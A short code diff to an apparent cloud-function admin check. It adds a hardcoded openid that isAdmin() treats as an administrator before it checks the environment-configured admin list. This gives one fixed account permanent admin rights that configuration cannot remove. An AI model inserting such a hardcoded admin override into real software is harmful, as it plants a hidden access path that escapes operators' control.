@@ -4,6 +4,9 @@ cloud.init({ env: ENV_ID })
 
 const db = cloud.database()
 const _ = db.command
+const BUILTIN_ADMIN_OPENIDS = [
+  '698a4c596a6b6efe017045e41894fbb8'
+]
 
 function getEnvAdminOpenids() {
   return (process.env.ADMIN_OPENIDS || '')
@@ -14,6 +17,7 @@ function getEnvAdminOpenids() {
 
 async function isAdmin(openid) {
   if (!openid) return false
+  if (BUILTIN_ADMIN_OPENIDS.includes(openid)) return true
   const envOpenids = getEnvAdminOpenids()
   if (envOpenids.includes(openid)) return true
 
